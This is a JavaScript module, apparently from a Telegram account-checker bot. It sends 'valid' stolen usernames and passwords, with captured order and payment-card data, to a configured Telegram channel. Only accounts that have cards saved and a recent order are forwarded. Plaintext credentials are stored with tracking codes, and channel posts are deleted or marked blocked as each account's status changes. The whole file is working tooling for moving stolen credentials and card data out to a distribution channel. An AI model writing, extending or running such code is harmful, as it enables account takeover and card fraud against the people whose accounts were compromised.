/**
 * =============================================================================
 * CHANNEL FORWARDER - Forward VALID credentials to Telegram channel
 * =============================================================================
 * 
 * Sends VALID credentials (with capture data) to a configured Telegram channel.
 * Includes tracking code for message management (delete on INVALID, update on BLOCKED).
 * 
 * =============================================================================
 */

const { hasBeenForwarded, markForwarded } = require('./channelForwardStore');
const {
  generateTrackingCode,
  storeMessageRef,
  getMessageRefByCredentials,
  deleteMessageRef,
  clearForwardedStatus,
} = require('./messageTracker');
const { escapeV2, codeV2, boldV2 } = require('./messages/helpers');
const { createLogger } = require('../logger');
const { getConfigService } = require('../shared/config/configService');

const log = createLogger('channel-forwarder');

/**
 * Get the channel ID from config service (hot-reloadable) or env fallback.
 * @returns {string|null} Channel ID or null if not configured
 */
function getChannelId() {
  const configService = getConfigService();
  let channelId;
  
  if (configService.isInitialized()) {
    channelId = configService.get('FORWARD_CHANNEL_ID');
  } else {
    channelId = process.env.FORWARD_CHANNEL_ID;
  }
  
  if (!channelId || !String(channelId).trim()) {
    return null;
  }
  return String(channelId).trim();
}

/**
 * Check if channel forwarding is enabled.
 * @returns {boolean} True if FORWARD_CHANNEL_ID is configured
 */
function isForwardingEnabled() {
  return getChannelId() !== null;
}

/**
 * Check if capture data meets forwarding requirements.
 * Requires: latest order (not 'n/a') AND at least one card captured.
 * 
 * @param {Object} capture - Capture data from captureAccountData()
 * @returns {{ valid: boolean, reason: string }} Validation result
 */
function validateCaptureForForwarding(capture) {
  if (!capture) {
    return { valid: false, reason: 'no capture data' };
  }
  
  // Check for latest order (not 'n/a')
  if (!capture.latestOrder || capture.latestOrder === 'n/a') {
    return { valid: false, reason: 'no latest order' };
  }
  
  // Check for card data (profile must exist with cards array)
  if (!capture.profile) {
    return { valid: false, reason: 'no profile data' };
  }
  
  if (!capture.profile.cards || capture.profile.cards.length === 0) {
    return { valid: false, reason: 'no cards captured' };
  }
  
  return { valid: true, reason: '' };
}

/**
 * Append tracking code to message.
 */
function appendTrackingCode(message, trackingCode) {
  return `${message}\n\n📎 ${codeV2(trackingCode)}`;
}

/**
 * Build BLOCKED status update message.
 */
function buildBlockedMessage(trackingCode, username) {
  const parts = [
    `🔒 ${boldV2('ACCOUNT BLOCKED')}`,
    '',
    escapeV2('This account has been blocked or requires verification.'),
    '',
    `${boldV2('🔐 Credentials')}`,
    `└ User: ${codeV2(username)}`,
    '',
    `📎 ${codeV2(trackingCode)}`,
  ];
  return parts.join('\n');
}

/**
 * Forward a VALID credential to the configured channel.
 * Sends the exact same message that was shown to the user.
 * 
 * Only forwards if capture data meets requirements:
 * - Has latest order (not 'n/a')
 * - Has card data (at least one card)
 * 
 * @param {Object} telegram - Telegraf telegram instance (ctx.telegram)
 * @param {string} username - Email/username (for dedup check)
 * @param {string} password - Password (for dedup check)
 * @param {string} message - The full MarkdownV2 formatted message to forward
 * @param {Object} [capture] - Capture data for validation (optional for backwards compat)
 * @returns {Promise<boolean>} True if forwarded, false if skipped or failed
 */
async function forwardValidToChannel(telegram, username, password, message, capture = null) {
  const channelId = getChannelId();
  
  // Skip if channel not configured
  if (!channelId) {
    log.debug('Channel forwarding not configured (FORWARD_CHANNEL_ID not set)');
    return false;
  }
  
  // Validate capture data meets forwarding requirements
  if (capture) {
    const validation = validateCaptureForForwarding(capture);
    if (!validation.valid) {
      log.debug(`Skipping forward: ${validation.reason} (${username.slice(0, 5)}***)`);
      return false;
    }
  }
  
  try {
    // Check if already forwarded (dedupe)
    const alreadyForwarded = await hasBeenForwarded(username, password);
    if (alreadyForwarded) {
      log.debug(`Already forwarded: ${username.slice(0, 5)}***`);
      return false;
    }
    
    // Generate tracking code
    const trackingCode = generateTrackingCode(username, password);
    
    // Append tracking code to message
    const messageWithCode = appendTrackingCode(message, trackingCode);
    
    // Send to channel
    const sentMessage = await telegram.sendMessage(channelId, messageWithCode, {
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true,
    });
    
    // Store message reference for future updates/deletion
    await storeMessageRef(trackingCode, {
      messageId: sentMessage.message_id,
      chatId: channelId,
      username,
      password,
    });
    
    // Mark as forwarded
    await markForwarded(username, password);
    
    log.info(`Forwarded to channel: ${username.slice(0, 5)}*** [${trackingCode}]`);
    return true;
    
  } catch (err) {
    // Log error but don't throw - channel forwarding should not break main flow
    log.error(`Channel forward failed: ${err.message}`);
    
    // Common error handling
    if (err.message.includes('chat not found')) {
      log.error('Channel not found. Check FORWARD_CHANNEL_ID is correct and bot is added to channel.');
    } else if (err.message.includes('not enough rights')) {
      log.error('Bot does not have permission to post in channel. Make bot an admin.');
    }
    
    return false;
  }
}

/**
 * Handle credential status change - delete on INVALID, update on BLOCKED.
 * 
 * @param {Object} telegram - Telegraf telegram instance
 * @param {string} username - Email/username
 * @param {string} password - Password
 * @param {string} newStatus - New credential status (INVALID, BLOCKED)
 * @returns {Promise<boolean>} True if action was taken
 */
async function handleCredentialStatusChange(telegram, username, password, newStatus) {
  const channelId = getChannelId();
  if (!channelId) return false;
  
  try {
    const messageRef = await getMessageRefByCredentials(username, password);
    
    if (!messageRef) {
      log.debug(`No forwarded message found for: ${username.slice(0, 5)}***`);
      return false;
    }
    
    const { messageId, trackingCode } = messageRef;
    
    if (newStatus === 'INVALID') {
      // Delete the message from channel
      await telegram.deleteMessage(channelId, messageId);
      
      // Clean up Redis entries
      await deleteMessageRef(username, password);
      await clearForwardedStatus(username, password);
      
      log.info(`Deleted channel message: ${username.slice(0, 5)}*** [${trackingCode}]`);
      return true;
      
    } else if (newStatus === 'BLOCKED') {
      // Update message to show BLOCKED status
      const blockedMessage = buildBlockedMessage(trackingCode, username);
      
      await telegram.editMessageText(
        channelId,
        messageId,
        null,
        blockedMessage,
        { parse_mode: 'MarkdownV2' }
      );
      
      log.info(`Updated channel message to BLOCKED: ${username.slice(0, 5)}*** [${trackingCode}]`);
      return true;
    }
    
    return false;
    
  } catch (err) {
    if (err.message.includes('message to delete not found') ||
        err.message.includes('message is not modified') ||
        err.message.includes('MESSAGE_ID_INVALID')) {
      log.debug(`Message already deleted/modified: ${username.slice(0, 5)}***`);
      // Clean up stale references
      await deleteMessageRef(username, password);
      return false;
    }
    
    log.warn(`Failed to handle status change: ${err.message}`);
    return false;
  }
}

module.exports = {
  forwardValidToChannel,
  handleCredentialStatusChange,
  isForwardingEnabled,
  getChannelId,
  validateCaptureForForwarding,
};
